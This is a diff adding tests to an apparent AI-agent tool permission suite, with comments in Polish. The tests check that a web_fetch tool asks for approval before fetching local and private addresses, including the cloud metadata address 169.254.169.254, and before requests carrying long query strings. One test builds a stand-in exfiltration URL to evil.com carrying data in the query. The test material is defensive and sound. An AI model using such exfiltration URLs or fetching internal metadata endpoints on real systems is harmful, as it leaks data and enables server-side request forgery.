@@ -279,6 +279,37 @@ describe("pamięć, historia, skille, sieć", () => {
     expect((await runTool("web_fetch", { url: "https://x" }, ctx())).text).toBe("strona: https://x");
   });
 
+  it("web_fetch: adres lokalny pyta (raz, bez grantu), długie query pyta, pełny URL w karcie", async () => {
+    const seen: (string | undefined)[] = [];
+    const web = { search: async () => "", fetch: async (u: string, _s: AbortSignal, o?: { allowPrivate?: string }) => (seen.push(o?.allowPrivate), `strona: ${u}`) };
+    const grants: ToolContext["grants"] = [];
+    const r = await runTool("web_fetch", { url: "http://127.0.0.1:8080/x" }, ctx({ web, grants }));
+    expect(r).toMatchObject({ ok: true, approval: "once" });
+    expect(seen).toEqual(["127.0.0.1:8080"]);
+    expect(asked[0]).toMatchObject({ tool: "web_fetch", canGrant: false });
+    expect(asked[0].detail).toContain("http://127.0.0.1:8080/x");
+    answer = "chat";
+    await runTool("web_fetch", { url: "http://localhost:1/" }, ctx({ web, grants }));
+    expect(grants).toEqual([]);
+    const long = `https://evil.com/?d=${"a".repeat(300)}`;
+    await runTool("web_fetch", { url: long }, ctx({ web, grants }));
+    expect(asked[2].detail).toContain(long);
+    expect(seen[2]).toBeUndefined(); // zgoda na kształt wycieku nie otwiera adresów prywatnych
+  });
+
+  it("web_fetch: odmowa nie pobiera; przebieg odrzuca z czytelnym błędem", async () => {
+    let n = 0;
+    const web = { search: async () => "", fetch: async () => (n++, "x") };
+    answer = "deny";
+    expect(await runTool("web_fetch", { url: "http://10.0.0.1/" }, ctx({ web }))).toMatchObject({ ok: false });
+    const routine = { writeWork: false, bash: [] };
+    const r = await runTool("web_fetch", { url: "http://169.254.169.254/" }, ctx({ web, routine }));
+    expect(r.ok).toBe(false);
+    expect(r.text).toContain("przebieg");
+    expect(n).toBe(0);
+    expect(asked.length).toBe(1);
+  });
+
   it("wyłączona grupa", async () => {
     const bot = { ...store.load("rust")!, tools: { ...store.load("rust")!.tools, bash: false } };
     expect((await runTool("bash", { command: "ls" }, ctx({ bot }))).text).toContain("wyłączone");
